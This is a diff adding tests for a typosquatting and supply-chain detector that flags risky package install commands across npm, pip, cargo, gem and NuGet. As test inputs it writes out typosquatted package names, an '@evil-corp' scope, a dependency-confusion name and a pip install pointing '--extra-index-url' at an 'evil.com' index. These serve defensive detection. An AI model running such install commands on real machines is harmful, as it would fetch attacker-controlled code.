@@ -6244,6 +6244,124 @@ test('getPolicySummary — returns summary', () => {
 });
 
 // ══════════════════════════════════════════════════
+//  Typosquatting & Supply Chain Detection
+// ══════════════════════════════════════════════════
+console.log('═══ 36. Typosquatting & Supply Chain Detection ═══');
+
+const typosquatMod = await import('../dist/risk/typosquat.js');
+const { parseInstallCommand, checkSupplyChain } = typosquatMod;
+
+test('parseInstallCommand: npm install', () => {
+  const result = parseInstallCommand('npm install lodash express');
+  assert.ok(result);
+  assert.equal(result.ecosystem, 'npm');
+  assert.deepEqual(result.packages, ['lodash', 'express']);
+});
+
+test('parseInstallCommand: pip install', () => {
+  const result = parseInstallCommand('pip install requests flask');
+  assert.ok(result);
+  assert.equal(result.ecosystem, 'pypi');
+  assert.deepEqual(result.packages, ['requests', 'flask']);
+});
+
+test('parseInstallCommand: cargo add', () => {
+  const result = parseInstallCommand('cargo add serde tokio');
+  assert.ok(result);
+  assert.equal(result.ecosystem, 'cargo');
+  assert.deepEqual(result.packages, ['serde', 'tokio']);
+});
+
+test('parseInstallCommand: gem install', () => {
+  const result = parseInstallCommand('gem install rails');
+  assert.ok(result);
+  assert.equal(result.ecosystem, 'rubygems');
+  assert.deepEqual(result.packages, ['rails']);
+});
+
+test('parseInstallCommand: dotnet add package', () => {
+  const result = parseInstallCommand('dotnet add package Newtonsoft.Json');
+  assert.ok(result);
+  assert.equal(result.ecosystem, 'nuget');
+  assert.deepEqual(result.packages, ['Newtonsoft.Json']);
+});
+
+test('parseInstallCommand: yarn add with version', () => {
+  const result = parseInstallCommand('yarn add axios@^1.0.0');
+  assert.ok(result);
+  assert.equal(result.ecosystem, 'npm');
+  assert.deepEqual(result.packages, ['axios']);
+});
+
+test('parseInstallCommand: returns null for non-install commands', () => {
+  assert.equal(parseInstallCommand('ls -la'), null);
+  assert.equal(parseInstallCommand('git commit -m "test"'), null);
+});
+
+test('checkSupplyChain: detects typosquat (1 char diff)', () => {
+  const signals = checkSupplyChain('npm install expresss');
+  assert.ok(signals.some(s => s.rule === 'typosquat'));
+});
+
+test('checkSupplyChain: detects typosquat (transposition)', () => {
+  const signals = checkSupplyChain('pip install reqeusts');
+  assert.ok(signals.some(s => s.rule === 'typosquat'));
+});
+
+test('checkSupplyChain: detects typosquat (prefix attack)', () => {
+  const signals = checkSupplyChain('npm install node-express');
+  assert.ok(signals.some(s => s.rule === 'typosquat'));
+});
+
+test('checkSupplyChain: detects typosquat (suffix attack)', () => {
+  const signals = checkSupplyChain('npm install lodash-js');
+  assert.ok(signals.some(s => s.rule === 'typosquat'));
+});
+
+test('checkSupplyChain: no false positive on legitimate package', () => {
+  const signals = checkSupplyChain('npm install express');
+  assert.ok(!signals.some(s => s.rule === 'typosquat'));
+});
+
+test('checkSupplyChain: detects scope confusion', () => {
+  const signals = checkSupplyChain('npm install @evil-corp/lodash');
+  assert.ok(signals.some(s => s.rule === 'scope_confusion'));
+});
+
+test('checkSupplyChain: detects dependency confusion', () => {
+  const signals = checkSupplyChain('npm install internal-auth-service');
+  assert.ok(signals.some(s => s.rule === 'dependency_confusion'));
+});
+
+test('checkSupplyChain: detects suspicious pip flags', () => {
+  const signals = checkSupplyChain('pip install something --extra-index-url http://evil.com/simple');
+  assert.ok(signals.some(s => s.rule === 'suspicious_install_flags'));
+});
+
+test('checkSupplyChain: detects typosquat across Python ecosystem', () => {
+  const signals = checkSupplyChain('pip install reqests');
+  assert.ok(signals.some(s => s.rule === 'typosquat'));
+});
+
+test('checkSupplyChain: detects typosquat in Cargo', () => {
+  const signals = checkSupplyChain('cargo add serdee');
+  assert.ok(signals.some(s => s.rule === 'typosquat'));
+});
+
+test('classifyRiskWithReasons includes supply chain signals', () => {
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'npm install expresss' });
+  const result = classifyRiskWithReasons(ev, makeConfig());
+  assert.ok(result.signals.some(s => s.rule === 'typosquat'));
+});
+
+test('evaluateAlerts fires typosquat alert', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'pip install reqeusts' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  assert.ok(alerts.some(a => a.alert_type === 'typosquat'));
+});
+
+// ══════════════════════════════════════════════════
 console.log('');
 console.log('══════════════════════════════════════════════════');
 console.log(`  RESULTS: ${passed} passed, ${failed} failed`);
